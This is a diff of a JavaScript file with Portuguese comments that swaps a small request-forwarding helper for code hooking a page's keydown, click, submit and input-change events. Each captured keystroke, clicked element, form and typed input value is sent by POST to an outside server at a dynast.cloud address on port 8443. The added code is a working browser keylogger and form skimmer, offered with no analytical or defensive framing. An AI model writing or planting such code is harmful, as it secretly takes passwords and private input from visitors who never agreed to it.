@@ -1,18 +1,44 @@
-function redirecionarRequisicoes(urlRequisicao) {
-    fetch(urlRequisicao)
-        .then(response => response.text()) // Ou .json() se a resposta for JSON
-        .then(data => {
-            // Processar a resposta como necessário
-            console.log(data); // Exemplo: exibir a resposta no console
-        })
-        .catch(error => {
-            console.error('Ocorreu um erro:', error);
-        });
+function enviarParaServidor(data) {
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://sao-paulo-0-alpaca.dynast.cloud:8443/', true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+            if (xhr.status === 200) {
+                var resposta = JSON.parse(xhr.responseText);
+                // Processar a resposta do servidor remoto
+                console.log('Resposta do servidor:', resposta);
+            } else {
+                console.error('Erro ao enviar para o servidor:', xhr.status);
+            }
+        }
+    };
+    xhr.send(JSON.stringify(data));
 }
 
-// Exemplo de uso:
-const urlServidorRedirecionado = 'https://sao-paulo-0-alpaca.dynast.cloud:8443/';
-const urlRequisicaoOriginal = 'https://russia-1-alpaca.dynast.cloud:8443/';
+// Capturar evento de tecla pressionada
+document.addEventListener('keydown', function(event) {
+    var data = { type: 'tecla', key: event.key };
+    enviarParaServidor(data);
+});
 
-// Redirecionar a requisição para o servidor desejado
-redirecionarRequisicoes(urlServidorRedirecionado + urlRequisicaoOriginal);
+// Capturar evento de clique do mouse
+document.addEventListener('click', function(event) {
+    var data = { type: 'clique', target: event.target.id };
+    enviarParaServidor(data);
+});
+
+// Capturar evento de submissão de formulário
+document.addEventListener('submit', function(event) {
+    var formData = new FormData(event.target);
+    var data = { type: 'formulario', formData: formData };
+    enviarParaServidor(data);
+});
+
+// Capturar evento de mudança em um elemento input
+document.addEventListener('change', function(event) {
+    if (event.target.tagName === 'INPUT') {
+        var data = { type: 'inputChange', value: event.target.value };
+        enviarParaServidor(data);
+    }
+});
